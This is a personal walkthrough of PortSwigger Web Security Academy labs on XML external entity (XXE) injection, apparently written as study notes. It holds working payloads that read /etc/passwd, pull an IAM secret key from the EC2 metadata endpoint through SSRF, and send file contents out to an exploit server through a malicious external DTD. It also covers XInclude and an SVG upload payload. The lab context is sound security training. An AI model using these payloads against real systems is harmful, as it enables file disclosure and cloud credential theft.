# Portswigger
## XML eternal entity (XXE) Injection
- In XML `&lt;` and `&gt;` represent the characters `<` and `>`.
### Exploiting XXE using external entities to retrieve files
```bash

#### This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

#### To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Change:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516201115.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516201149.png)

### Exploiting XXE to perform SSRF attacks
```bash

#### This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

#### The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

#### To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.

Use end-point: http://169.254.169.254/

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Change:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>&xxe;<productId>1</productId>
<storeId>1</storeId></stockCheck>

Response:

"Invalid product ID: 
latest
"

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
<stockCheck>&xxe;<productId>1</productId>
<storeId>1</storeId></stockCheck>

Response:

"Invalid product ID: 
meta-data
"

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
<stockCheck>&xxe;<productId>1</productId>
<storeId>1</storeId></stockCheck>

Response:

"Invalid product ID: 
iam
"

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
<stockCheck>&xxe;<productId>1</productId>
<storeId>1</storeId></stockCheck>

Response:

"Invalid product ID: 
security-credentials
"

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
<stockCheck>&xxe;<productId>1</productId>
<storeId>1</storeId></stockCheck>

Response:

"Invalid product ID: 
admin
"

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>&xxe;<productId>1</productId>
<storeId>1</storeId></stockCheck>

 "SecretAccessKey" : "cOyGrUT6TpETjFsF0n4wJRwiE91CxwWoSSKKQRJF"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516203009.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516203041.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516203125.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516203147.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516203210.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516203231.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516203257.png)

### Blind XXE with out-of-band interaction
```bash

#### This lab has a "Check stock" feature that parses XML input but does not display the result.

#### You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.

#### To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Go to: Burp -> Burp Collaborator client -> Copy to clipboard
Change:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://whh0ztdas20kxd9tuyd5hjyyipofc4.oastify.com"> ]>
<stockCheck>&xxe;<productId>1</productId>
<storeId>1</storeId></stockCheck>

Go to: Burp Collaborator client
Click "Poll now"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516204734.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516204759.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516204823.png)

### Blind XXE with out-of-band interaction via XML parameter entities
```bash

#### This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

#### To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Go to: Burp -> Burp Collaborator client -> Copy to clipboard
Change:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://cfv2hlc98tkddymo4c3pz6pi79d01p.oastify.com"> %xxe; ]>
<stockCheck>1<productId>1</productId>
<storeId>1</storeId></stockCheck>

Go to: Burp Collaborator client
Click "Poll now"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516213449.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516213521.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516213536.png)

### Exploiting blind XXE to exfiltrate data using a malicious external DTD //
```bash

#### This lab has a "Check stock" feature that parses XML input but does not display the result.

#### To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Go to: "Go to exploit server"
File: 

/malicious.dtd

Body:

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-ac6c1f911e617b97c03b0e96012e0099.web-security-academy.net/malicious.dtd?x=%file;'>">
%eval;
%exfiltrate;

Click "Store"
Change:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-ac6c1f911e617b97c03b0e96012e0099.web-security-academy.net/malicious.dtd"> %xxe; ]>
<stockCheck>1<productId>1</productId>
<storeId>1</storeId></stockCheck>

Go to: "Access log"
Find the outlier IP with the hostname following the "x="

4df981f29bd0

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516215120.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516215428.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516222034.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516215502.png)

### Exploiting blind XXE to retrieve data via error messages
```bash

#### This lab has a "Check stock" feature that parses XML input but does not display the result.

#### To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

#### The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Go to: "Go to exploit server"
File: 

/malicious.dtd

Body:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

Click "Store"
Change:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-ac6c1f911e617b97c03b0e96012e0099.web-security-academy.net/malicious.dtd"> %xxe; ]>
<stockCheck>1<productId>1</productId>
<storeId>1</storeId></stockCheck>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516220411.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516220538.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516221619.png)

### Exploiting XXE to retrieve data by repurposing a local DTD
```bash

#### This lab has a "Check stock" feature that parses XML input but does not display the result.

#### To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

#### You'll need to reference an existing DTD file on the server and redefine an entity from it.

##### Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.`

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Change:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
<stockCheck>1<productId>1</productId>
<storeId>1</storeId></stockCheck>

Response:

HTTP/1.1 200

Visit:

https://www.apt-browse.org/browse/ubuntu/bionic/main/amd64/yelp/3.26.0-1ubuntu2/file/usr/share/yelp/dtd/docbookx.dtd

Note the first entity name: "ISOamsa"

<!ENTITY % ISOamsa PUBLIC
"ISO 8879:1986//ENTITIES Added Math Symbols: Arrow Relations//EN//XML"
"isoamsa.ent">

Change:

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

To

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

Change:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId></stockCheck>

To

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck>1<productId>1</productId>
<storeId>1</storeId></stockCheck>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516223507.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516223526.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516224532.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516224558.png)

### Exploiting XInclude to retrieve files
```bash

#### This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

#### Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack.

#### To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Change:

productId=2&storeId=1

To

productId=
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
&storeId=1

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516230208.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516230240.png)

### Exploiting XXE via image file upload
```bash

#### This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

#### To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.


Go to: "View post"

Create an .svg file called "image.svg"
Content:

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE host [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="15" x="0" y="16">&xxe;</text>
</svg>

Input:
Comment:

comment

Name:

name

Avatar:

image.svg

Email:

email@email.com

Intercept is on
Click "Post comment"
Send to repeater (For contingency plan if status code "302" is not received)
Intercept is off
Right-click in browser "View Page Source"
Navigate to the newly posted avatar from username "name" (svg file will convert to a png file)
Right-click "Open Link in New Tab"
Find the content of "/etc/hostname" in the png file:

a42b13dbcd8b

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516232542.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516232604.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516232652.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516232710.png)

#hacking
